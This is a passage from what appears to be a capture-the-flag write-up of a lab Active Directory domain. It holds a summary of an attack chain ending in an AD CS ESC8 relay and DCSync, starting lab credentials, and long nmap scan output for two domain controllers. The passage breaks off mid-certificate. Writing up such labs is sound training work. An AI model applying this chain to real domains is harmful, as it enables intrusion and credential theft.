---
title: HackSmarter - Dismay
date: 2026-07-01
image: cover.png
tags: [HackSmarter, Medium, Windows, Active Directory]
excerpt: A medium three-host Active Directory box that pivots through a standalone WSUS server to loot credentials from Recycle Bin documents and a password-protected archive, chains ForceChangePassword and GenericAll edges across several users, and relays a coerced domain controller through AD CS ESC8 to DCSync the Administrator hash.
---

# Dismay

### Starting Credentials

```python
xiao.ge:AmBZATVjnH4qo8H4
```

There are 3 machines:

- DC1: 10.1.144.132
- DC2: 10.1.222.111
- Nexus: 10.1.157.198

Each of them is scanned in turn.

### NMAP Scanning - DC1

```python
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-30 19:42:58Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:42:13
| Not valid after:  2026-12-12T13:42:13
| MD5:   c7f1:e8e6:5284:5c2b:6c7d:6126:acfb:62df
| SHA-1: 8f8d:0940:0326:01cc:6421:b23f:fb6c:8108:a319:cb0e
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAkoUcPxf8CmhQAAAAAACTANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzNDIxM1oXDTI2MTIx
| MjEzNDIxM1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANKR450o
| hnPc7gPFWT8dGr6Bv6rK6ICg/pR5WVtQIYNHzgSxcRUDG4ipLhiNq/TjmhaSzm+9
| Oe0GlY8xkbDcA69jF4umwgEi/4Zx8oc7kjlM4MA9Il9StX48PfpO/sEXqVNAlnwa
| V3TGaPlKE7CGU1J2tRA24flI0nXNsLcHseOFvh11MkD5RBmgS75wIt5bAc172bOf
| gStlx8YUh17lYAV4+vgliAgEp3Lv2QO3BOAnMOQ3CJwpSOeu0zX7cwqlABpksavG
| bPVdW4zibWOuM/rCsNatye4H3p7Om9VelpwKLiaUEaHl6oncR5+nsODw3HJsJKwR
| ZY8eERyIw7o/nEUCAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUoJhQeVb4nomOQdJOr+04
| eKrv0EowHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMS5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAFBWG66aJPUXzRSHju8L+KepPbQIjl7Ga7yrVvxdopUgXa3ZBBrZqBHv
| /4Th1Ivb7jOMWFcuqibcnGdljAfmLkHHA2W0VKLDdIFlTc2DsifYNLbnPtfkr1Kd
| mLOYvF2UQJrCHKJqgaQyGSJqVahyiyHEf31AHSuy39syyWJ8X4OnPrWw1qZYRW/7
| xdtkp00EH4kkjVTmWpWHUmGyeeTbxjtDnhFNs+AQ3KXtVb5YKeZi+4F/L9tAs9rk
| kr00NA7DLSDK49uqcQATzziTtTr1+/OqSJew7iv54BTIiF2UtAAz8MYJ9c9PqLoU
| ERWYbfhKq11w2cc5m8iqzNsSaM2aZv0=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:42:13
| Not valid after:  2026-12-12T13:42:13
| MD5:   c7f1:e8e6:5284:5c2b:6c7d:6126:acfb:62df
| SHA-1: 8f8d:0940:0326:01cc:6421:b23f:fb6c:8108:a319:cb0e
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAkoUcPxf8CmhQAAAAAACTANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzNDIxM1oXDTI2MTIx
| MjEzNDIxM1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANKR450o
| hnPc7gPFWT8dGr6Bv6rK6ICg/pR5WVtQIYNHzgSxcRUDG4ipLhiNq/TjmhaSzm+9
| Oe0GlY8xkbDcA69jF4umwgEi/4Zx8oc7kjlM4MA9Il9StX48PfpO/sEXqVNAlnwa
| V3TGaPlKE7CGU1J2tRA24flI0nXNsLcHseOFvh11MkD5RBmgS75wIt5bAc172bOf
| gStlx8YUh17lYAV4+vgliAgEp3Lv2QO3BOAnMOQ3CJwpSOeu0zX7cwqlABpksavG
| bPVdW4zibWOuM/rCsNatye4H3p7Om9VelpwKLiaUEaHl6oncR5+nsODw3HJsJKwR
| ZY8eERyIw7o/nEUCAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUoJhQeVb4nomOQdJOr+04
| eKrv0EowHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMS5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAFBWG66aJPUXzRSHju8L+KepPbQIjl7Ga7yrVvxdopUgXa3ZBBrZqBHv
| /4Th1Ivb7jOMWFcuqibcnGdljAfmLkHHA2W0VKLDdIFlTc2DsifYNLbnPtfkr1Kd
| mLOYvF2UQJrCHKJqgaQyGSJqVahyiyHEf31AHSuy39syyWJ8X4OnPrWw1qZYRW/7
| xdtkp00EH4kkjVTmWpWHUmGyeeTbxjtDnhFNs+AQ3KXtVb5YKeZi+4F/L9tAs9rk
| kr00NA7DLSDK49uqcQATzziTtTr1+/OqSJew7iv54BTIiF2UtAAz8MYJ9c9PqLoU
| ERWYbfhKq11w2cc5m8iqzNsSaM2aZv0=
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:42:13
| Not valid after:  2026-12-12T13:42:13
| MD5:   c7f1:e8e6:5284:5c2b:6c7d:6126:acfb:62df
| SHA-1: 8f8d:0940:0326:01cc:6421:b23f:fb6c:8108:a319:cb0e
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAkoUcPxf8CmhQAAAAAACTANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzNDIxM1oXDTI2MTIx
| MjEzNDIxM1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANKR450o
| hnPc7gPFWT8dGr6Bv6rK6ICg/pR5WVtQIYNHzgSxcRUDG4ipLhiNq/TjmhaSzm+9
| Oe0GlY8xkbDcA69jF4umwgEi/4Zx8oc7kjlM4MA9Il9StX48PfpO/sEXqVNAlnwa
| V3TGaPlKE7CGU1J2tRA24flI0nXNsLcHseOFvh11MkD5RBmgS75wIt5bAc172bOf
| gStlx8YUh17lYAV4+vgliAgEp3Lv2QO3BOAnMOQ3CJwpSOeu0zX7cwqlABpksavG
| bPVdW4zibWOuM/rCsNatye4H3p7Om9VelpwKLiaUEaHl6oncR5+nsODw3HJsJKwR
| ZY8eERyIw7o/nEUCAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUoJhQeVb4nomOQdJOr+04
| eKrv0EowHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMS5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAFBWG66aJPUXzRSHju8L+KepPbQIjl7Ga7yrVvxdopUgXa3ZBBrZqBHv
| /4Th1Ivb7jOMWFcuqibcnGdljAfmLkHHA2W0VKLDdIFlTc2DsifYNLbnPtfkr1Kd
| mLOYvF2UQJrCHKJqgaQyGSJqVahyiyHEf31AHSuy39syyWJ8X4OnPrWw1qZYRW/7
| xdtkp00EH4kkjVTmWpWHUmGyeeTbxjtDnhFNs+AQ3KXtVb5YKeZi+4F/L9tAs9rk
| kr00NA7DLSDK49uqcQATzziTtTr1+/OqSJew7iv54BTIiF2UtAAz8MYJ9c9PqLoU
| ERWYbfhKq11w2cc5m8iqzNsSaM2aZv0=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC1.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:42:13
| Not valid after:  2026-12-12T13:42:13
| MD5:   c7f1:e8e6:5284:5c2b:6c7d:6126:acfb:62df
| SHA-1: 8f8d:0940:0326:01cc:6421:b23f:fb6c:8108:a319:cb0e
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAkoUcPxf8CmhQAAAAAACTANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzNDIxM1oXDTI2MTIx
| MjEzNDIxM1owADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBANKR450o
| hnPc7gPFWT8dGr6Bv6rK6ICg/pR5WVtQIYNHzgSxcRUDG4ipLhiNq/TjmhaSzm+9
| Oe0GlY8xkbDcA69jF4umwgEi/4Zx8oc7kjlM4MA9Il9StX48PfpO/sEXqVNAlnwa
| V3TGaPlKE7CGU1J2tRA24flI0nXNsLcHseOFvh11MkD5RBmgS75wIt5bAc172bOf
| gStlx8YUh17lYAV4+vgliAgEp3Lv2QO3BOAnMOQ3CJwpSOeu0zX7cwqlABpksavG
| bPVdW4zibWOuM/rCsNatye4H3p7Om9VelpwKLiaUEaHl6oncR5+nsODw3HJsJKwR
| ZY8eERyIw7o/nEUCAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUoJhQeVb4nomOQdJOr+04
| eKrv0EowHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMS5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTEwMDAwDQYJKoZIhvcNAQEL
| BQADggEBAFBWG66aJPUXzRSHju8L+KepPbQIjl7Ga7yrVvxdopUgXa3ZBBrZqBHv
| /4Th1Ivb7jOMWFcuqibcnGdljAfmLkHHA2W0VKLDdIFlTc2DsifYNLbnPtfkr1Kd
| mLOYvF2UQJrCHKJqgaQyGSJqVahyiyHEf31AHSuy39syyWJ8X4OnPrWw1qZYRW/7
| xdtkp00EH4kkjVTmWpWHUmGyeeTbxjtDnhFNs+AQ3KXtVb5YKeZi+4F/L9tAs9rk
| kr00NA7DLSDK49uqcQATzziTtTr1+/OqSJew7iv54BTIiF2UtAAz8MYJ9c9PqLoU
| ERWYbfhKq11w2cc5m8iqzNsSaM2aZv0=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-06-30T19:44:28+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.dismay.hsm
| Issuer: commonName=DC1.dismay.hsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-06-29T19:36:46
| Not valid after:  2026-12-29T19:36:46
| MD5:   fd35:ebf1:712f:aed2:8522:4a1e:310d:eb93
| SHA-1: 338b:c980:fe9d:ad15:090b:707b:9f95:25e5:c49a:1249
| -----BEGIN CERTIFICATE-----
| MIIC4DCCAcigAwIBAgIQfV3l/GNcE4dO/j1GhHmC0TANBgkqhkiG9w0BAQsFADAZ
| MRcwFQYDVQQDEw5EQzEuZGlzbWF5LmhzbTAeFw0yNjA2MjkxOTM2NDZaFw0yNjEy
| MjkxOTM2NDZaMBkxFzAVBgNVBAMTDkRDMS5kaXNtYXkuaHNtMIIBIjANBgkqhkiG
| 9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0UBl+f13utl/8UsbZJ9mSCRGhrXhwoO/hmc6
| JCZ1t+Pcegj6eOFd15WlH3VCjKQyf43j/6YampyNEwpNmuznmvmXp7uyfTp9fNat
| J7VpfXqjJ59Db1c/d4uxdA1rJZ9CIrrAOBwEoTNJ/amZXNtuq4TnIPyfoyZhmGdE
| qLR2lmEOKAcJXPpm1aPx164k1C6NtijQDtV2zAzf9io5R3KcMBEhYKBXsZUboAy+
| R0wWDnUm5LNk4yL0xrfScoX/Ugm08W8VxVcZPSBizkdmYMB52oJ2N8W7MS4kv9Fq
| gVM3yuhyMsxRkyIuy2d8x1wvyXKuhBjisl6BmSTUTe5ExAiZjQIDAQABoyQwIjAT
| BgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQAD
| ggEBAJXCZCpD4L8uwDjaFhuZpQoEd6MTW1iAIy7TvOr5iLuCcrlXd44/xEYepiM0
| Top5gD3JokYjV04YeOrB8VCQ/kHb/PnfpRumI7eCjeiG+LykIivuY2gztmdcCP/t
| cRes0wc2bVvQJk7ZMkA0jYmTOks/HxjJ0iBKRReed3vTfsXlBy9y2HJM7uP3RvOq
| TsTFxmx1NIgVTkyKT9QuriMU7KB4QXQd5bp52SLjHSvZnqeGCLnhHJtQ6+UEu80l
| fcdqbIv356agc8Ll4RdX16THJ/olehtKCFKOpNZ0RG7FHi6EVJJUpYPAGi1yzHPq
| VqQ+QpB8R5KQRAIlB98GM7lH5dg=
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: DISMAY
|   NetBIOS_Domain_Name: DISMAY
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: dismay.hsm
|   DNS_Computer_Name: DC1.dismay.hsm
|   DNS_Tree_Name: dismay.hsm
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-30T19:43:49+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
57170/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
57172/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
57184/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
57198/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
63066/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 8039/tcp): CLEAN (Timeout)
|   Check 2 (port 55518/tcp): CLEAN (Timeout)
|   Check 3 (port 11344/udp): CLEAN (Timeout)
|   Check 4 (port 42734/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2026-06-30T19:43:49
|_  start_date: N/A
```

### NMAP Scanning - DC2

```python
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-30 19:43:10Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: dismay.hsm0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC2.dismay.hsm, DNS:dismay.hsm, DNS:DISMAY
| Issuer: commonName=dismay-DC2-CA/domainComponent=dismay
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T13:39:44
| Not valid after:  2026-12-12T13:39:44
| MD5:   ece8:532d:5f54:8f97:a891:097c:b6f5:63f4
| SHA-1: fcd4:8621:ebd0:e262:3ac8:8cd9:8b79:ade7:a540:183a
| -----BEGIN CERTIFICATE-----
| MIIF4zCCBMugAwIBAgITMgAAAAY9M8Bkl5WiMAAAAAAABjANBgkqhkiG9w0BAQsF
| ADBFMRMwEQYKCZImiZPyLGQBGRYDaHNtMRYwFAYKCZImiZPyLGQBGRYGZGlzbWF5
| MRYwFAYDVQQDEw1kaXNtYXktREMyLUNBMB4XDTI1MTIxMjEzMzk0NFoXDTI2MTIx
| MjEzMzk0NFowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALqXJXJ3
| xJ0CtRoiKqWPbC4tG6c1rILd736G8wx86mrJU3OrmrSPYVWGGu+7Ioy7+EZa0yBS
| n5ObPAxkpQU42nN4kmdxVkY5wK9A6cCzrA0EO/2EU27eykbZw3AZyr+HwqYNTvi7
| wxHehSWAk9Xuy5zQNH1lFWyNlWTfc2Su+mTBii3wLeIhbviv55lclAiIPJzRZmte
| XXiJiWLpZ+lqvWwFSpVBhJZh/pFhy+t4FYaq8B/BktVCkRMYKTSBep89mnrHAhqC
| pMgXgCi5jtlN2u2zXfS/dvVCsXAPbxpIAaWC0evgrR44PDOcNMYz5JWn/KLBNeso
| VUoz37065zcrEGECAwEAAaOCAw8wggMLMDYGCSsGAQQBgjcVBwQpMCcGHysGAQQB
| gjcVCIaL0m2Ci5EUh92XI52yC6bSAYFiASECAW4CAQAwMgYDVR0lBCswKQYIKwYB
| BQUHAwIGCCsGAQUFBwMBBgorBgEEAYI3FAICBgcrBgEFAgMFMA4GA1UdDwEB/wQE
| AwIFoDBABgkrBgEEAYI3FQoEMzAxMAoGCCsGAQUFBwMCMAoGCCsGAQUFBwMBMAwG
| CisGAQQBgjcUAgIwCQYHKwYBBQIDBTAdBgNVHQ4EFgQUgHL5yMq9PJzBGLkcldFN
| GQjUhv4wHwYDVR0jBBgwFoAUcjsiP0AlkITf7wMtDk41epYddmkwgcYGA1UdHwSB
| vjCBuzCBuKCBtaCBsoaBr2xkYXA6Ly8vQ049ZGlzbWF5LURDMi1DQSxDTj1EQzIs
| Q049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9ZGlzbWF5LERDPWhzbT9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gb4GCCsGAQUFBwEBBIGxMIGuMIGrBggrBgEFBQcwAoaBnmxkYXA6Ly8vQ049ZGlz
| bWF5LURDMi1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMsQ049
| U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1kaXNtYXksREM9aHNtP2NBQ2Vy
| dGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5
| MDAGA1UdEQEB/wQmMCSCDkRDMi5kaXNtYXkuaHNtggpkaXNtYXkuaHNtggZESVNN
| QVkwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMtMS01LTIxLTEz
| NTk1MDE5NjItNDA2NDYzNDg0MS0zNTU4NTU5NzMxLTExMTQwDQYJKoZIhvcNAQEL
| BQADggEBAKvkXteyBeFfOzckwvNvzbHozt08cYhfTbI3XNBIl+gMxvcDnk0LsdOe
| fsyRGXz6R8afnilitCeew452LTtHETgsuAo90kUAk0bj9sLsACtQGHj3fDswHi3I
| HHGnhjmzqzllyBuh53eJIsXke9cnE+EMnmQxnVphBq/RSqtYqNelOQfTAQGByk5Q
| vMHVjZBWIPx9IXqjcxhWjbhPOwi/FBiYUiucXpZmti78SUYmWm0VGaSjFJU4IrQQ
| oGcjOa6XzVqToevHRisPxAsG3BIX3TMluIW4iRnpIYZSfyT/PQjl86gZ2+3htXMN
